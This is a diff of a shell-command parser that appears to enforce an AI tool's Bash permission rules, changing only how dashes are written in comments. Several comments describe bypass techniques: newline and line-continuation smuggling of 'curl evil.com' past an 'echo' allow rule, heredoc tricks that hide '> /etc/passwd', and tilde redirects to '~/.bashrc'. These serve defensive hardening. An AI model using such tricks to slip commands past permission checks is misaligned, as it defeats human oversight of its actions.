@@ -55,7 +55,7 @@ function isStaticRedirectTarget(target: string): boolean {
   // Reject any target containing whitespace or quote chars (quotes indicate
   // the placeholder-restoration preserved a quoted arg).
   if (/[\s'"]/.test(target)) return false
-  // Reject empty string — path.resolve(cwd, '') returns cwd (always allowed).
+  // Reject empty string \u2014 path.resolve(cwd, '') returns cwd (always allowed).
   if (target.length === 0) return false
   // SECURITY (parser differential hardening): shell-quote parses `#foo` at
   // word-initial position as a comment token. In bash, `#` after whitespace
@@ -125,7 +125,7 @@ export function splitCommandWithOperators(command: string): string[] {
   // returns a single-element array that downstream permission checks process
   // as ONE subcommand. If we return the ORIGINAL (pre-join) text, the
   // validator checks `foo\<NL>bar` while bash executes `foobar` (joined).
-  // Exploit: `echo "$\<NL>{}" ; curl evil.com` — pre-join, `$` and `{}` are
+  // Exploit: `echo "$\<NL>{}" ; curl evil.com` \u2014 pre-join, `$` and `{}` are
   // split across lines so `${}` isn't a dangerous pattern; `;` is visible but
   // the whole thing is ONE subcommand matching `Bash(echo:*)`. Post-join,
   // zsh/bash executes `echo "${}" ; curl evil.com` \u2192 curl runs.
@@ -292,7 +292,7 @@ export function splitCommand_DEPRECATED(command: string): string[] {
       // prefix of the NEXT redirect (`>&1`). Detect this: nextPart ends with
       // ` <FD>` AND afterNextPart is a redirect operator. Split off the FD
       // suffix so isStaticRedirectTarget sees only the actual target. The FD
-      // suffix is harmless to drop — it's handled when the loop reaches `>&`.
+      // suffix is harmless to drop \u2014 it's handled when the loop reaches `>&`.
       let effectiveNextPart = nextPart
       if (
         (part === '>' || part === '>>') &&
@@ -642,12 +642,12 @@ export function extractOutputRedirections(cmd: string): {
 
   // SECURITY: Extract heredocs BEFORE line-continuation joining AND parsing.
   // This matches splitCommandWithOperators (line 101). Quoted-heredoc bodies
-  // are LITERAL text in bash (`<< 'EOF'\n${}\nEOF` — ${} is NOT expanded, and
+  // are LITERAL text in bash (`<< 'EOF'\n${}\nEOF` \u2014 ${} is NOT expanded, and
   // `\<newline>` is NOT a continuation). But shell-quote doesn't understand
   // heredocs; it sees `${}` on line 2 as an unquoted bad substitution and throws.
   //
   // ORDER MATTERS: If we join continuations first, a quoted heredoc body
-  // containing `x\<newline>DELIM` gets joined to `xDELIM` — the delimiter
+  // containing `x\<newline>DELIM` gets joined to `xDELIM` \u2014 the delimiter
   // shifts, and `> /etc/passwd` that bash executes gets swallowed into the
   // heredoc body and NEVER reaches path validation.
   //
@@ -687,7 +687,7 @@ export function extractOutputRedirections(cmd: string): {
   const parseResult = tryParseShellCommand(processedCommand, env => `$${env}`)
 
   // SECURITY: FAIL-CLOSED on parse failure. Previously returned
-  // {redirections:[], hasDangerousRedirection:false} — a silent bypass.
+  // {redirections:[], hasDangerousRedirection:false} \u2014 a silent bypass.
   // If shell-quote can't parse (even after heredoc extraction), we cannot
   // verify what redirections exist. Any `>` in the command could write files.
   // Callers MUST treat this as dangerous and ask the user.
@@ -849,7 +849,7 @@ function hasDangerousExpansion(target: ParseEntry | undefined): boolean {
     target.startsWith('!') || // History expansion (was only in isSimpleTarget)
     target.startsWith('=') || // Zsh equals expansion (=cmd -> /path/to/cmd)
     // ALL tilde-prefixed targets. Previously `~` and `~/path` were carved out
-    // with a comment claiming "handled by expandTilde" — but expandTilde only
+    // with a comment claiming "handled by expandTilde" \u2014 but expandTilde only
     // runs via validateOutputRedirections(redirections), and for `~/path` the
     // redirections array is EMPTY (isSimpleTarget rejected it, so it was never
     // pushed). The carve-out created a gap where `> ~/.bashrc` was neither
@@ -1177,7 +1177,7 @@ function needsQuoting(str: string): boolean {
   // SECURITY: Must match ALL characters that the regex `\s` class matches.
   // Previously only checked space/tab; downstream consumers like ENV_VAR_PATTERN
   // use `\s+`. If reconstructCommand emits unquoted `\n` or `\r`, stripSafeWrappers
-  // matches across it, stripping `TZ=UTC` from `TZ=UTC\necho curl evil.com` —
+  // matches across it, stripping `TZ=UTC` from `TZ=UTC\necho curl evil.com` \u2014
   // matching `Bash(echo:*)` while bash word-splits on the newline and runs `curl`.
   if (/\s/.test(str)) return true
 
